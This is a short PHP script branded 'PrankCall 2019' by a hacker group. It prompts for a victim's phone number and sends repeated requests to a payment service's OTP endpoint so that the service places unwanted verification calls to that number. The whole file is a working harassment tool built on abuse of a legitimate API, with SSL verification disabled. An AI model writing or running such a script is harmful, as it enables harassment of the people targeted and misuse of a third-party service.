<?php
// Limit 3x Telpon Setiap Satu Nomor
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
echo "
############################################################
                   =============
                   PrankCall 2019
                   =============

    Coded      : Bartes Dwiky
    Pacar      : Fetty Fardiyah
    Contact    : clayhackerteam404@gmail.com
    Github     : https://github.com/ClayHackerTeam
    Youtube    : FREE TUTORIAL
    Instagram  : @bartes_07
    Thanks to  : All Member ClayHackerTeam

############################################################\n";
echo "Nomor\nTarget : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>
